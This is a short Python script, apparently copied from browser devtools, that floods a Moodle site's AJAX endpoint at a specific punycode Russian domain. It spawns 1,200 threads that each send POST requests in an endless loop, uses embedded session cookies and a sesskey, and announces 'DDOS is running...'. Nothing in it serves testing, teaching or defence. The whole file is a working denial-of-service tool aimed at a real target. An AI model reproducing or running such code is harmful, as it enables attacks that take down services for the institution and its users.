"""from curl_fetch2py import CurlFetch2Py"""
import requests
from threading import Thread
thrnom = 1200

cookies = {
    'MoodleSession': '1t5biks56lk9kqvjmba29aamil',
    'MOODLEID1_': '%25220xh',
}

headers = {
    'Connection': 'keep-alive',
    # 'Cookie': 'MoodleSession=1t5biks56lk9kqvjmba29aamil; MOODLEID1_=%25220xh',
    'Origin': 'https://xn--d1auh.xn----8sbnlgibn8c8a2f.xn--p1ai',
    'Referer': 'https://xn--d1auh.xn----8sbnlgibn8c8a2f.xn--p1ai/my/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 YaBrowser/24.12.0.0 Safari/537.36',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru,en;q=0.9',
    'content-type': 'application/json',
    'sec-ch-ua': '"Chromium";v="130", "YaBrowser";v="24.12", "Not?A_Brand";v="99", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-requested-with': 'XMLHttpRequest',
}

params = {
    'sesskey': '4yFVI6Jd3P',
    'info': 'media_videojs_get_language',
}

json_data = [
    {
        'index': 0,
        'methodname': 'media_videojs_get_language',
        'args': {
            'lang': 'ru',
        },
    },
]

def ddos():
    while True:
        spam = requests.post(
    'https://xn--d1auh.xn----8sbnlgibn8c8a2f.xn--p1ai/lib/ajax/service.php',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
        print(spam)
for i in range(thrnom):
    thr = Thread(target = ddos)
    thr.start()
print('DDOS is running...')
